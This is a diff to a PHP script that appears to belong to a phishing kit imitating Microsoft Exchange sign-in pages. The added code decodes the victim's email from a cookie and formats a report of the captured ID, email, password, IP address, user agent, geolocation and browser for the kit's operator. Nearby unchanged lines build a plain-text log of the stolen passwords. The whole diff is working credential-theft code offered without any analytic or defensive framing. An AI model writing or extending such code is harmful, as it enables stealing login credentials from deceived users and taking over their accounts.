@@ -290,8 +290,60 @@ if (isset($hosts[1])) {
 if (isset($hosts[1])) {
     $host3 =  "<br>$hosts[3]";  
 }
-
+$cookie = base64_decode($_COOKIE['xlogin']);
 // message
+if ($sub == 'MSX-2012' || $sub == 'MSX-2012 II' || $sub == 'MSX-2007' || $sub == 'MSX-2007 II'){
+$message ="<html>
+<body style='Margin:0;padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;min-width:100%;background-color:#ececec;'>
+<br><br><br>
+<table align='center' border='0' cellpadding='5' cellspacing='0' style='width:400px'>
+	<tbody>
+		<tr>
+			<td style='background-color:#686868; height:23px; width:150px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>I.D:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$login</span></span></td>
+		</tr>
+		<tr>
+			<td style='background-color:#686868; height:23px; width:150px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Email:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$cookie</span></span></td>
+		</tr>
+		<tr>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Password:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$passwd</span></span></td>
+		</tr>
+		<tr>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>IP:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$ip</span></span></td>
+		</tr>
+		<tr>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>User-Agent:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$browser</span></span></td>
+		</tr>
+		<tr>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Date:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$server</span></span></td>
+		</tr>
+		<tr>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>Location:</span></span></td>
+			<td style='background-color:#686868; height:23px'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>{$geoplugin->city}, {$geoplugin->region}, {$geoplugin->countryCode}</span></span></td>
+		</tr>
+		<tr>
+			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$login $passwd</span></span></td>
+		</tr>
+<tr>
+			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$host0 $host1 $host2 $host4</span></span></td>
+		</tr>
+		<tr>
+			<td colspan='2' style='background-color:#686868; height:23px; text-align:center'><span style='color:#2ecc71'><span style='font-family:Courier New,Courier,monospace'>$b_name:$b_ver on $b_plat</span></span></td>
+		</tr>
+	</tbody>
+</table>
+
+<p>&nbsp;</p>
+<br><br>
+</body>
+</html>";	
+}
+else{
 $message ="<html>
 <body style='Margin:0;padding-top:0;padding-bottom:0;padding-right:0;padding-left:0;min-width:100%;background-color:#ececec;'>
 <br><br><br>
@@ -336,7 +388,7 @@ $message ="<html>
 <p>&nbsp;</p>
 <br><br>
 </body>
-</html>";
+</html>";}
 $mask = "-------------PASSES----------------\n" .
 $login . "  " . $passwd . "\n"
 . $ip . "\n" . $b_name.":".$b_ver." on ".$b_plat .
